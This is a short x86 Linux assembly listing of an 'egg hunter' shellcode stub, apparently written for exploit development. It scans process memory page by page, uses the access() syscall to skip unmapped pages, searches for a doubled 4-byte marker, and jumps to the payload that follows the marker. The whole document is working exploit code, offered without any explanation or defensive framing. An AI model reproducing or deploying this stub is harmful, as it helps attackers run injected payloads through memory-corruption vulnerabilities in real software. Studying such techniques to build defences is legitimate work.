section .text
        global _start
 
_start:
  xor ebx, ebx
  xor ecx, ecx
 
next_page:
  or dx, 0xFFF

next_address:
  inc edx

  ;access call
  ;mov cl, 0x5, seems to work okay keeping it as null 
  lea ebx, [edx+4] ; using +4 which ensures check of ebx - ebx +8 to be valid
  push 0x21
  pop eax
  int 0x80 
  cmp al, 0xf2  
  je next_page
  
  mov eax, 0x11223344
  mov edi, edx
  scasd   
  jne next_address
  scasd   
  jne next_address
  
  jmp edi

